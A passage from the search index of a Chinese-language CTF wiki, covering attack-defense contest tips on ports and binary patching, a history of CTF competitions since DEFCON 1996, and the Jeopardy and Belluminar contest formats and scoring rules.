\u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002 Warning \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002","title":"\u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3"},{"location":"introduction/experience/#patch","text":"\u7a0b\u5e8f patch \u8981\u5408\u7406\uff0c\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u662f check \u54ea\u91cc\u5e76\u672a\u516c\u5f00\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002 \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684 patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002 \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002","title":"\u670d\u52a1 patch \u4e0e\u9632\u5fa1"},{"location":"introduction/experience/#_2","text":"\u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002","title":"\u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb"},{"location":"introduction/experience/#_3","text":"\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002 \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002 \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002 \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002","title":"\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565"},{"location":"introduction/history/","text":"\u672c\u680f\u5185\u5bb9\u6458\u81ea\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u5728 i \u6625\u79cb\u4e0a\u7684\u516c\u5f00\u89c6\u9891\u300cCTF \u7684\u8fc7\u53bb\u3001\u73b0\u5728\u4e0e\u672a\u6765\u300d\u3002 CTF \u7684\u8d77\u6e90 \u00b6 CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u7684\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002 \u65e9\u671f CTF \u7ade\u8d5b \u00b6 \u6700\u5f00\u59cb\u7684 CTF \u6bd4\u8d5b\uff081996 \u5e74-2001 \u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u5df1\u51c6\u5907\u7684\u6bd4\u8d5b\u76ee\u6807\u81ea\u5df1\u9632\u5b88\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u63d0\u4f9b\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u8bf7\u6c42\u624b\u5de5\u8ba1\u5206\u3002 \u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002 \u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b \u00b6 \u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002 \u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a \u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u4e0d\u53d7\u91cd\u89c6\u3002 \u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002 \u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002 \u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u7814\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u7ef4\u4ee5\u53ca\u9762\u5411\u5b89\u5168\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002","title":"History"},{"location":"introduction/history/#ctf","text":"CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u7684\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002","title":"CTF \u7684\u8d77\u6e90"},{"location":"introduction/history/#ctf_1","text":"\u6700\u5f00\u59cb\u7684 CTF \u6bd4\u8d5b\uff081996 \u5e74-2001 \u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u5df1\u51c6\u5907\u7684\u6bd4\u8d5b\u76ee\u6807\u81ea\u5df1\u9632\u5b88\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u63d0\u4f9b\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u8bf7\u6c42\u624b\u5de5\u8ba1\u5206\u3002 \u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002","title":"\u65e9\u671f CTF \u7ade\u8d5b"},{"location":"introduction/history/#ctf_2","text":"\u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002 \u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a \u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u4e0d\u53d7\u91cd\u89c6\u3002 \u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002 \u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002 \u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u7814\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u7ef4\u4ee5\u53ca\u9762\u5411\u5b89\u5168\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002","title":"\u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b"},{"location":"introduction/mode/","text":"\u89e3\u9898\u6a21\u5f0f - Jeopardy \u00b6 \u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u4e0e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u8d5b\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u6392\u540d\u3002 \u76f8\u4e0d\u540c\u7684\u662f\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002 \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002 \u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002 \u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar \u00b6 \u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002 \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/ \u8d5b\u5236\u4ecb\u7ecd \u00b6 Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u8fdb\u884c\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u8fdb\u884c\u5206\u4eab\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002 \u51fa\u9898\u9636\u6bb5 \u00b6 Each team is required to submit 2 challenges to the challenge bank of the sponsor. \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa\u9898\uff0c\u9898\u91cf\u4e3a 2 \u9053\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907\u9898\u76ee\u3002\u51fa\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002 Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053\u9898\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2a\u5219\u4e3a\u975e Linux \u5e73\u53f0\u7684 Challenge\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u5219\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002 \u4e3a\u4f7f\u6bd4\u8d5b\u9898\u76ee\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51fa\u9898\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684\u9898\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002 \u63d0\u4ea4\u90e8\u7f72 \u00b6 \u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u51fa\u9898\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u8981\u6c42\u51fa\u9898\u6587\u6863\u4e2d\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup \u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\uff0c\u89e3\u9898\u4ee3\u7801\u3002 \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u89e3\u51b3\u3002\u6700\u7ec8\u90e8\u7f72\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002 \u89e3\u9898\u7ade\u6280 \u00b6 \u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe\u7f6e First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002 \u5206\u4eab\u8ba8\u8bba \u00b6 \u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u8fdb\u884c\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u7684\u5206\u4eab\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u5927\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002 \u8ba1\u5206\u89c4\u5219 \u00b6 \u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u8d28\u91cf\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1aScore = MaxScore -- | N -- Expect\uff3fN |\u3002\u8fd9\u91cc N \u662f\u6307\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u5e94\u8be5\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf 